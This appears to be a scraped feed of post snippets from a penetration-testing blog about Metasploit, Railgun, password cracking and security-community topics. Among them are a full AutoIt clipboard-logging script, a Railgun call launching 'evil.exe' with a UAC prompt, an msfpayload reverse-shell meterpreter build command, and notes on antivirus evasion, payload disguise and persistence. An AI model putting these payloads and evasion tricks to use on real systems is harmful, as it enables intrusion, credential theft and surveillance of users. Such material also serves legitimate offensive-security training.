      <description>A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At DerbyCon Chris Gates and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the ShellExecute windows function.aspx&amp;rdquo;) via Railgun with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:
client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],]) client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)  This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;lsquo;evil.</description>

#include &amp;lt;Clipboard.au3&amp;gt; #include &amp;lt;File.au3&amp;gt; $oldclip = &amp;quot;&amp;quot; While 1 $clip = _ClipBoard_GetData() If $clip &amp;lt;&amp;gt; &amp;quot;0&amp;quot; Then If $clip &amp;lt;&amp;gt; $oldclip Then _FileWriteLog(@UserProfileDir &amp;amp; &amp;quot;clip.log&amp;quot;, $clip) $oldclip = $clip EndIf EndIf Sleep(100) WEnd  It&amp;rsquo;s pretty straight forward, and I welcome everyone to install AutoIt3 and compile/run the above script to see what it does (although most of you I&amp;rsquo;m sure can figure it out just by reading it).</description>

      <description>When Google Reader decided to remove everything it was good for, we all scrambled to find new homes for things we wanted to share. Tumblr became a place that most of us flocked. I&amp;rsquo;ve found Tumblr to be not a very good substitue for Google Reader&amp;rsquo;s functionality (IMHO).
The other day, carnal0wnage told me about a service called &amp;lsquo;Buffer&amp;rsquo;, and all this thing does is do scheduled tweets, but it has one distinct feature, not only is it focused around the sharing of links, it works (if you install the browser plugin/extension) INSIDE OF GOOGLE READER ;-) So you can be reading a feed item, push a button and not have to open a page or another app, it&amp;rsquo;s pretty much all right there.</description>

      <description>Pentest Monkey is a great resource for a lot of things. One of which is this:
John The Ripper Hash Formats | pentestmonkey
I used it, plus a bit of bash fu to try to figure out some hashes that I was trying to crack.
Step 1: Create file of supported hash types. For me, that was simple I just threw the following in &amp;lsquo;supported_types.txt&amp;rsquo; in the same directory as john.</description>

      <description>This Christmas I&amp;rsquo;ve decided to spread a little cheer (aka free stuff) ;-) , and I&amp;rsquo;m doing it in 2600 fashion. Now, I don&amp;rsquo;t know if I have enough readers to pull this off, but here goes:
I will be sending 1 No Starch book of the winner&amp;rsquo;s choice each day for 12 days starting on December 1st. Here&amp;rsquo;s the catch. To win the books you must submit a picture of a door or room that is unmistakably &amp;lsquo;Room 362&amp;rsquo;.</description>

      <description>Jcran recently blogged about an easy way to run a post module on all sessions:
http://blog.pentestify.com/simple-framework-domain-token-scanner
msf&amp;gt; use post/windows/gather/enum_domain_tokens msf enum_domain_tokens&amp;gt; irb framework.sessions.each do |session| run_single(&amp;quot;set SESSION #{session.first}&amp;quot;) run_single(&amp;quot;run&amp;quot;) sleep 1 end  You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.</description>

      <description>In @carnal0wnage and my presentation at DerbyCon 2011 we talked about using SCREEN and SCRIPT to keep connections live / use them across SSH sessions, and log everything that happens. What we didn&amp;rsquo;t cover is the fact that there isn&amp;rsquo;t a time stamp for those logs. Now, Metasploit has multiple ways of creating logs:
 cat ~/.msf4/logs/framework.log  This log automatically logs all of the error data that is great for trouble shooting when something is working, but doesn&amp;rsquo;t record what you are doing inside of msfconsole  msf&amp;gt; spool ~/myclient.</description>

      <description>On Vista and above there is a Windows &amp;lsquo;Redirector&amp;rsquo; (A redirector is basically a Symlink or fake directory that&amp;rsquo;s there but not in Windows) (more info here.aspx&amp;rdquo;)) that allows a 32bit process create a 64bit one. For anyone who has tried to run &amp;lsquo;execute -H -c -f notepad.exe&amp;rsquo;, they know that if they are in a 32bit process, they get a 32bit notepad even if they are on a 64bit system, which is annoying.</description>

The Dirty Little Secrets They Didn&amp;rsquo;t Teach You In Pentesting Class
&amp;ldquo;This talk is about methodologies and tools that we use or have coded that make our lives and pentest schedule a little easier, and why we do things the way we do. Of course, there will be a healthy dose of Metasploit in the mix. &amp;ldquo;</description>

      <description>Say you go for the 500+ shells on an internal test or your phishing exersice goes way better than you thought. Well you need to get your bearings quickly and going into each shell and doing a ps, then looking through the list for all the users logged in is a bit of a pain and defintely not ideal.
I wrote a quick script that you can throw in the meterpreter scripts folder to aide you a bit with this:</description>

      <description>This doesn&amp;rsquo;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&amp;rsquo;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit:
~.  Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away.</description>

      <description>John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&amp;rsquo;s stdin function but I like to run rules against my lists and I didn&amp;rsquo;t see any how-tos on doing this. Here is my way:
ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt
This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I).</description>

      <description>Update 1: No this doesn&amp;rsquo;t need to be in memory since you control the system but it was a fun challenge
Update 2: The info from the &amp;lsquo;adduser&amp;rsquo; payload says &amp;lsquo;Create a new user and add them to local administration group&amp;rsquo; - I&amp;rsquo;m guessing since I ran this on a DC is why I didn&amp;rsquo;t notice this but it is something to keep in mind when running this script.
Update 3: Here is a powershell way of doing things from a CSV, you can do some passwords in the CSV and keep it for reference too.</description>

      <description>I saw a post back in June and it just recently came up again:
http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/
It looked like a lot of hard work to set that up and I&amp;rsquo;m really lazy. I didn&amp;rsquo;t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called &amp;lsquo;gethostbyaddr&amp;rsquo; using Railgun.
TL:DR; You can download the post module here: ipresolver.</description>

      <description>One important thing to note about Railgun is that you are querying the API and just as if you were using C++ the API you are calling just might not be there on the system you are trying to call it on. So here is a quick trick to find out if a the function (API) that you are trying to call is available to you:
For my example I&amp;rsquo;m using &amp;lsquo;getaddrinfo&amp;rsquo; since it&amp;rsquo;s life in Windows is somewhat odd.</description>

But I&amp;rsquo;ve never tried setting it myself. Well, a client called me out. You can&amp;rsquo;t! (well at least not through the UI )</description>

      <description>This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (more info). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm).

      <description>I&amp;rsquo;ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I&amp;rsquo;ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails)</description>

      <description>I missed the 3 year anniversary of NoVA Hackers but I did want to make a post about it since we are still going strong and are now at ~150 active members.
Chris Gates and I started this thing together back in October of 2008 which spawned off of Chris&amp;rsquo; idea to start a AHA (Austin Hackers Association)-like group in NoVA. It&amp;rsquo;s ideals merged with the already going NoVA Security Luncheons that I was throwing in Reston VA and DC was where it all started.</description>

The DLL is used by Windows when it is acting as a Fax server (anyone still do that?). He mentions some very interesting points:
 The DLL gets loaded at login by Explorer The DLL exists in System32 but is looked for in Windows first Explorer doesn&amp;rsquo;t try to use anything inside of it via exports unless the system is acting as a fax server (aka safe to put a pretty bland DLL there)  I thought&amp;hellip; no it couldn&amp;rsquo;t be that simple&amp;hellip; lets see:</description>

      <description>In Part 1 I gave an example I used at CCDC with the single &amp;lsquo;windows/download_exec&amp;rsquo;. One of the down sides of that payload is you need to host the binary, giving up an IP/host that can be blocked. Well, Google recently (a couple months ago) allowed people to upload &amp;lsquo;anything&amp;rsquo; to Google docs. And you can then share these files publicly. Probably already see where I&amp;rsquo;m going with this, but here are some steps to get it going, first upload your malicious binary (not the dropper &amp;lsquo;windows/download_exec&amp;rsquo;, but the file it needs to execute).</description>

      <description>Payload selection is something that rarely gets talked about in detail. Most PoCs just use calc.exe, netcat, or some kind of socket. The vast majority of Metasploit tutorials, videos and documentation use the _windows/meterpreter/reverse_tcp_ payload which is only one of 224 possible payloads. Here is a little disclaimer: While the payloads in Metasploit don&amp;rsquo;t get updated as much as other parts of Metasploit, this is a point in time documentation of them (June 23, 2011) and the payloads available in Metasploit are constantly changing.</description>

      <description>Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well.
Another way you can do this without the injection is just sending a suspend to all the threads in the process.
pid = 2980 targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) targetprocess.</description>

      <description>Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: http://blog.didierstevens.com/2011/04/27/suspender-dll/
Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well.</description>

      <description>When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:</description>

      <description>Not sure how far back it goes (Win95?) but 2000, XP and all the way up to Win 7 have a program called DOSKEY:
C:\Users\vmadmin&amp;gt;doskey /? Edits command lines, recalls Windows commands, and creates macros. DOSKEY [/REINSTALL] [/LISTSIZE=size] [/MACROS[:ALL | :exename]] [/HISTORY] [/INSERT | /OVERSTRIKE] [/EXENAME=exename] [/MACROFILE=filename] [macroname=[text]] /REINSTALL Installs a new copy of Doskey. /LISTSIZE=size Sets size of command history buffer. /MACROS Displays all Doskey macros. /MACROS:ALL Displays all Doskey macros for all executables which have Doskey macros.</description>

      <description>Constant connections and odd binaries running on systems usually get caught pretty quickly in CCDC events. However, NFS exports are hardly ever noticed. Setting it up on an Ubuntu/Debian box is a snap and given the right directory and permissions can lead you right back to getting shell any time you want without a constant connection. Plus, NFS blends right in and can listen on TCP and/or UDP (2049)

      <description>The following are good adds to your DNS brute force list:
These are all SRV records so make sure your type is set correctly. The great thing about SRV records is that it tells you the port in the answer. Isn&amp;rsquo;t that nice of them?
I don&amp;rsquo;t know of any DNS tools that utilize SRV as part of their process, but scripting dig to do so isn&amp;rsquo;t tough.

      <description>This day and age everyone is worried about the insider threat. Internal Penetration Testing doesn&amp;rsquo;t really test what would happen if your janitor got paid 50 bucks to put a USB stick in one of your servers. External Penetration Tests are never scoped for that sort of testing. So what is a company to do? How can they know what the risk is? The answer? Usually they guess or assume. Mostly because they are scared to find out, it&amp;rsquo;s happened to them before, or one of a million different justifications.</description>

In the last post I showed off how Archive.org&amp;rsquo;s Wayback machine can be used to pull urls for a domain, another place where URLs are stored and can be searched by domain is Delicious.com (a bookmarking service).

      <description>Archive.org allows you to check the history of sites and pages, but a service most are not aware of is one that allows you to get a list of every page that a Archive.org has for a given domain. This is great for enumerating a web applications, many times you&amp;rsquo;ll find parts of web apps that have been long forgotten (and usually vulnerable).
This module doesn&amp;rsquo;t make any requests to the targeted domain, it simply outputs a list to the screen/or a file of all the pages it has found on Archive.</description>

      <description>Most malicious IP lists focus on the client side threat, where servers (hosted or exploited) host client side exploits or evil scripting.
These don&amp;rsquo;t really help the server admins very much. Project Honeypot does an amazing job at keeping detailed information on scanners / harvesters and brute forcers, the likes of which are the daily enemy of said admins. They offer a service called HTTP Block List or &amp;lsquo;HTTP:BL&amp;rsquo;.
Another way this list differs from the rest is it isn&amp;rsquo;t a list you can download.</description>

      <description>When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.</description>

      <description>Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.

      <description>Ask any developer and they will tell you that the age of a project is not calculated in calendar time, but in worker hours or &amp;ldquo;commits&amp;rdquo; to a project. The Metasploit Framework hit 10,000 today.
With the project dating back to 2003, much before the official &amp;ldquo;Revision 1&amp;rdquo; happened, there have been a lot of changes. Going from the initial incarnation as a network &amp;ldquo;game&amp;rdquo; written in perl to the world largest ruby project, the framework has seen it&amp;rsquo;s fair share of blood, sweat, and tears.</description>

You are now warned to change your root password when you pop into Cydia and Rock the first time. But this thing just wont stay down.
If you have jailbroken your iPad you might want to check out a little file called &amp;ldquo;master.passwd&amp;rdquo;. In it, there is another user called &amp;lsquo;mobile&amp;rsquo; which has been pointed out since 2008 (here) on the iPhone as another account to change the password of.</description>

      <description>Ever set up a multi/handler and get an odd IP hitting it? Probably forgot about it as internet chatter? Think again, you might have just been caught
AV Tracker - http://avtracker.info/ is a site that tracks the different IP addresses, hostnames, computer names and user agents that AV and other &amp;ldquo;Submit-your-malware-here&amp;rdquo; drop boxes use.
Peter Kleissner and his team provide
 ranges that the hosts use a dynamic text file with the IP addresses listed if you want to add it to some auto updating block list a line by line IPTABLES block config and even C code to add into your binary to make sure it doesn&amp;rsquo;t talk out from one of those addresses (I could be reading it wrong, still a beginner in C)  The team has been criticized a lot by AV vendors, enough so the took down the site in January of this year.</description>

      <description>Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:
http://mail.metasploit.com/pipermail/framework/2010-June/006382.html
And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712: http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712
Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:
 iphlpapi ws2_32 kernel32 ntdll user32 advapi32  (You can find out exactly what functions are available by default in the api.</description>

But, he gave me exact references, so I went to Twitpic to check them out for myself.</description>

      <description>*WARNING* if you use fgdump like I did, it extracts pwdump to %TEMP% at run time, which is detected by AV.
First of all, I was floored when this worked. Really AV? It&amp;rsquo;s that easy? Really?
So here is the break down, go get &amp;ldquo;Resource Hacker&amp;ldquo;… You&amp;rsquo;re almost done. Only 3 steps left. (1 of which is optional)
I started with fgdump, a well known hashdumping/pwdump tool. It&amp;rsquo;s detected by 80% of all AVs and by all the top 10.</description>

Anyways, the story left off being a very limited user called &amp;ldquo;Network Service&amp;rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.

Responsible Disclosure  Direct Contact =&amp;gt; depending on the size of the vendor and their view on security, this could result in anything from a simple thanks, a reward, to a court hearing. Exploit Broker =&amp;gt; possibly sell, possibly not, depends on the broker.</description>

http://ha.ckers.org/blog/20100129/large-list-of-rfis-1000/
it&amp;rsquo;s a great list, but as soon as I saw it, I was like.. hmm.. how can I use that? Well, being that I am a Burp fan, I parsed the .dat with the following line:
cat rfi-locations.dat | grep -v &amp;quot;^#&amp;quot; | awk -F &#39;?&#39; &#39;{print $1}&#39; | sort -u &amp;gt; rsnake_list.txt  This pulls his list down to 906 entries which you can load in to Burp and hammer away with Intruder.</description>

You know what I got in return? a resounding &amp;ldquo;No&amp;rdquo; from everyone. (well I had one outlier but, who doesn&amp;rsquo;t when you are trying to apply science to prove art) I challenge you to name another non-artistic career that people are so passionate about that they would stay in it even if they won the lottery.</description>

Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
Or you can get it via the SVN at Revision 7872
By creating a bind payload instead of a reverse connect we can have the payload listen locally.</description>

This short tutorial is how to get Ruby 1.9.1 on BT4 or any other Linux distro with the tool &amp;lsquo;rvm&amp;rsquo; (Ruby Version Manager).
The Metasploit team has put a lot of work into getting the framework to work well with 1.9.1 and still work with earlier versions.</description>

You can search by keyword, and/or using any of the advanced search options.
 country: 2-letter country code hostname: full or partial host name net: IP range using CIDR notation (ex: 18.7.7.0/24 ) port: 21, 22, 23 or 80  Here is just a taste of the power this bring to the game:</description>

A bunch of sites on the web give you different pages depending on the browser you use to view it. I know when I was a web developer compatibility was the bane of my existence, as I&amp;rsquo;m sure it still is for all the web devs out there. Well, sometimes this leads to bad coding practices, or even the old &amp;ldquo;Google Bot gets to see everything&amp;rdquo; feature.</description>

      <description>We (the security community) all know, and make fun of &amp;ldquo;Users&amp;rdquo;, and &amp;ldquo;Admins&amp;rdquo;. They are derogatory terms in our community. So much so, that they could almost be classified at curse words. (I can see the XKCD now: Security stick figure talking to IT stick figure. &amp;ldquo;You stupid A****&amp;ldquo;).
While I neither discount their &amp;ldquo;contribution&amp;rdquo; to making my day fun, I feel that a lot of people miss an even bigger threat: Policies and Procedures, or SOP (Standard Operating Procedures).</description>

      <description>Disclaimer: I was given a demo license of the new free business product to break/review. No money has traded hands. This is my brutally honest opinion of the product.
I&amp;rsquo;ve played with a gambit of Astaro products, and personally I really hate UTMs, just like I do All-In-One Printer/Copier/Faxes. One thing breaks, they all do. However, Astaro&amp;rsquo;s .. before I go into my opinions of the product, or get on any soap box, here are the facts:</description>

      <description>In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.
But before I get into the new feature, lets quickly go over the standard way you use msfencode:
root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3#  We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload.</description>

Dave Shackleford recently posted an excellent blog entry titled “One for the n00bs”: http://daveshackleford.com/?p=277
It relates the security community to a high school cafeteria. It’s a good read and pretty dead on. I want to echo his sentiments, “I got my OWN lunch table. And you’re invited.”, I”m just an email away. I also wanted to let you know there are a lot of places where you can learn on your own, at your own pace, and without any chance of ridicule.</description>

I have added some permissions to the group to maximize privacy options while still allowing for interaction other than me sending out BCC&amp;rsquo;d messages to everyone:
 Private Invite Only - basically to keep spam out
 Only Managers can view Member List - so those who want don&amp;rsquo;t want their email addresses seen can join and just listen for announcements and regular message traffic</description>

      <description>I had a bet with my friend about getting #1 on the Crazy Taxi high score page (== motivation for this post).
For those who have not been introduced to it yet, it&amp;rsquo;s a Facebook/Flash/2.0 resurrection of a much older game.
Not having extreme timing skills, I quickly gave up on getting the 2,000,000 points required to make it the &amp;ldquo;normal&amp;rdquo; way: My first try was modifying the outgoing HTTP traffic using the Tamper Data plugin for Firefox (to catch the obvious ones).</description>

      <description>Yes, I just called everyone who works at Apple an Oompa Loompa, but I digress:
I was reading Brooke Crothers&amp;rsquo; story on the Apple &amp;lsquo;gag&amp;rsquo; order [1] and couldn&amp;rsquo;t help but think of how Apple has created an almost similar situation. Everyone wants to know what Apple is up to, can&amp;rsquo;t stop talking about it. Buzz Out Loud [2] even had people call and email asking them to see if they could do a show without mentioning Apple or the iPhone.</description>

      <description>CKTricky over at http://cktricky.blogspot.com has been running an awesome Burp Tip of the Day series on his blog. After seeing him use Nikto through Burp. I decided to see if I could just export the list of checks to a text file so that I could use them over and over in Intruder. After a bit of awk and sed hell I figured it out, and submited it to him for acceptance to his BTotD series.</description>

      <description>Brute force, even though it&amp;rsquo;s gotten so fast, is still a long way away from cracking long complex passwords. That&amp;rsquo;s were word lists come in handy. It&amp;rsquo;s usually the crackers first go-to solution, slam a word list against the hash, if that doesn&amp;rsquo;t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with.</description>

      <description>Update I can&amp;rsquo;t say with 100% certainty that Nessus ever used NMAP as it&amp;rsquo;s base scanner, I was going off of memory. I apologize for not being perfect.
Update 2 Since people can&amp;rsquo;t seem to let it go, I would say that I was totally wrong and the nmap was absolutely never used in nessus ever, but then I would be caught in another absolute that I can&amp;rsquo;t confirm. According to their wiki, the nmap nasl script were taken out because people were No, I haven&amp;rsquo;t listened to the latest episode of Securabit in which Paul comes on and talks about Nessus.</description>

I want to pose a statement. &amp;ldquo;Simplicity is Security&amp;rdquo;. The reason I say this is that this day in age, at least in the US, &amp;lsquo;convenience&amp;rsquo; is king. And we try to protect those conveniences with &amp;lsquo;security&amp;rsquo;.

      <description>I recently visited Tokyo, Japan. Just as always, my curiosity got the best of me and I started to calculate the population density of the buildings where I was staying. Giving fudge factor of non-populated apartments, I estimated 8,500 families in twelve 15 story buildings, living in a 1.5 mile square piece of land.That&amp;rsquo;s CRAZY. Mass transit and unrestricted modes of transit are not a whim, they are a requirement. I bet you&amp;rsquo;re asking how this applies to security, or for that matter computers at all.</description>

      <description>Well, sorta…
I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.
Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.</description>

      <description>There are a lot of tools that I find in my endeavors would be really helpful, but can’t find on the net for whatever reason.
 A portable version of of tshark that has ARP spoofing capabilities. I want to be able to drop the file, issue the arguments and pull the pcap back.
 A application that can sniff traffic from a specific process. Metasploit’s keylogger is sort of there as it only pulls keys from the process of which it is attached (DLL is to ‘fault’ for this).</description>

The first being that Hacker Conferences have become sort of commercialized with most speakers going for their day in the lime light or to pimp some product/0day. And the second being a lot of the talks are things that most can’t go home / back to work and test out or implement.</description>

      <title>PassiveX fun with Metasploit</title>

      <description>I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the IExpress “hack” would make for an very hard to spot payload.
A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back.</description>

      <description>I recently posted a blog post to Exotic Liability&amp;rsquo;s website with the same title, and I realized that it would make a great thing to post to here, and update regularly, or just put it on the wiki I keep saying that I get going here. Enough rambling, here is how you can get your fill of security:

  From Couch To Career In 80 Hours  from Rob Fuller 
I have put this article off quite a few times due to some very cool and interesting things happening in our field as it applies to getting a job. That, and Matt Johansen beat me to it with his blog post titled: &amp;ldquo;A lot of Information Security Career Advice&amp;rdquo;, which I highly recommend you check out and add to your RSS reader.</description>

      <description>Dark0perator and I will be giving a workshop at ToorCamp coming up July 2nd-5th:
You can find us on the ToorCamp site: http://www.toorcamp.org/content/W13
Here is the description of our talk, save the bio(s):
The Art of Pivot and Persistence: Shell is only the beginning.
 This workshop is based on the assumption that you have some level of access on a target system. From that it is demonstrated how to go from that level of access to taking over the whole company and how to keep that access, surviving reboots, AV scans, and even reimaging.</description>

      <description>I highly recommend both of these courses, and the chance to get in front of the instructors and ask questions live is worth it IMHO. So bang on those manager doors and work it out, because seats fill quickly and they are limited. **Check out the [Offensive Security - Instructor Lead Training](http://www.offensive-security.com/ilt.php) page for updated information.**
We are excited to announce our next Offsec Live Classes. Since you asked to be notified of our next dates you will be happy to be among the first to have your teams invited to one of our next classes.</description>

      <description>First I wanted to say, sorry for this and the last installment of Room362 being non-technical. They are topics that I feel strongly about and so felt impelled to share.One of the biggest problems in the world, IMHO, are people who have unfounded hate. This is compounded by the anonymity of the Internet. Allowing that hate to have no reprocussion or identity. Let me also say I have a deep respect for Free Speech, the depths of which I fear, few truly know.</description>

      <description>My recent post &amp;ldquo;OzymanDNS - Tunneling SSH over DNS&amp;rdquo; caused a good friend, and someone I highly respect in the information security field, Dave Hull from Trusted Signal, to call me out on the ethics of the post.
Instead of lying to you, Dave, and to myself, I did not put any thought into the ethics of the post until Dave brought it up. Well, except for that auto subconscious RIGHT/WRONG check.</description>

      <description>Recently I have been debating on whether to get a Netbook or the Kindle 2. (I am only in this debate because my lovely wife decided to buy a table and chairs, for the house. There is no winning when they buy things for &amp;lsquo;the house&amp;rsquo; or &amp;lsquo;the kids&amp;rsquo;).
Anyways, I tweeted up my dilemma and got a huge amount of responses. They came from both sides of the fence. Some said Kindle and some said Netbook, and they all had good arguments.</description>

      <description>Most of you Twitterholics have seen this beautiful status. You get a total of 100 API calls per Twitter account per hour. What happens if you use all of your afforded calls? You can just use http://www.twitter.com/ no problem right? Well you loose a lot of what makes Twitter clients so useful (search, grouping, instant updates.. etc).
Well, what if you leave you client up at home? TweetDeck by itself uses most of the API calls just by itself.</description>

      <description>Hiding Meterpreter with IExpress from mubix on Vimeo.
Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it&amp;rsquo;s easyier to dupe, or a different malicious executable (leekspin perhaps?</description>

      <description>Let me start off this post by saying that the main focus of any of these competitions is not to win, but to learn. Learning is usually accompanied by tears on the defenders side, but the best way to learn is to fail.
That said though, the title of this post is about how to win:
Planning Phase: This is where you win or lose. If you don&amp;rsquo;t have a good plan and a good team layout ahead of time, you are screwed.</description>

Here is the bribe. I need a video of The Middler in action. From start (downloading) to finish (compromise / root / BeEF / owange) of another machine.
The video must be without audio, pausing a bit with each step, and a maximum of 1020 x 720 in resolution preferably in Camtasia Studio format.</description>

It challenged me to think and learn new skills on the fly. You start the course with a bunch of video files, a huge pdf and an lzm file to get your VPN setup. It is self paced and intense. The topics cover everything from Back|Track basics to the HXDEF rootkit.</description>

      <title>Retractions - Web App and SAMBA</title>

      <description>First: Using SAMBA to crack Unix passwords
Theory: You compromise a unix host during a pentest and grab /etc/shadow and /etc/password. You take the entries for root in both and drop them into a unix host that you control that is set up with SAMBA to sync authentication. You then use windows methods to extract the LM/NTLM hash from SAMBA.
Problem: SAMBA doesn’t cache the LM/NTLM hash until the correct one is passed to it.</description>

      <description>The Full Disclosure mailing list has a long and illustrious past. It has played host to everything from zero days to politics. One thing that has rung true for a number of years, if not since it’s inception is that it is unregulated (save spam of course). However in recent months it has fallen pray to less and less technical discussions, and more bickering, name calling, and outright trolling.
The reason for this post is to let everyone know that has unsubscribed, that a change is coming.</description>

      <description>TiVo and DVRs in general have brought TV watching a long way. Some of the innovations that have come of it have made the TV experience better. Commercial skipping is my own personal favorite. But some of the other features are pausing, rewinding, and fast forwarding (after you are behind a bit obviously) and finally recording. Now, recording live TV is nothing new. People have done it since VCRs were invented, and I’m sure much before then.</description>

 Javascript adding hidden files upload form fields that are auto populated with C:\Windows\System32\config\SAM or C:\Windows\Repair .. yadada. You get the idea.

 Death by bullets (Yes this is bulleted to be ironic). But seriously, this was a reoccuring theme throughout the meeting. Try and keep it to 3 or 5.</description>

      <description>I believe there is a fear in the security community about speaking. Most don’t believe they either have something important enough to say, or have some awesome ‘thing’ and are just too afraid of the stage. Here are some resources and videos that have helped me gain the confidence to speak.

      <description>This is an untested theory, but I don’t see why it wouldn’t work. Anyone who wants to prove it either way is very welcome to comment on the matter below.
Ok. Say you have the following exerpt from an /etc/shadow file:
root:awac7eQv2CT0g:12685:0:10000:::: billybob:$7$b1XHzqR5$RJxOyHRAix2rVmtXyHkLikmnod.z94P6vSL1h8ZeUdY/urvOvkvJjg2hn/J0r90YAdAA8HedGIPR2D7.zIzJS0:14438:0:99999:7:::  Both passwords in clear text are “uncrackable”. Here is where the trick comes into it. We use the weakness in LM hashes to crack the password (as long as it’s under 15 characters of course).</description>

      <description>Alright you all have heard of some of the annoying items that make ThinkGeek a one stop shop for cube warfare, such as the Annoy-a-tron and the Phantom Keystroker. Well nothing can hold a candle to the BSODomizer. Along the lines of the Annoy-a-tron and the Phantom Keystroker, this device is hardware and messes with your target on a timer based method. But what gets added to the mix is the fact that it has an IR reciever as well, so while you are giggling in your cube trying not to bust up laughing, you can actually use any Universal Remote set to the Sony TV code, a TV-B-Gone (Mitch Altman’s awesome invention), or even a computer that it set to send that signal from it’s IR port.</description>

      <description>Yesterday on Twitter I posed 3 questions:
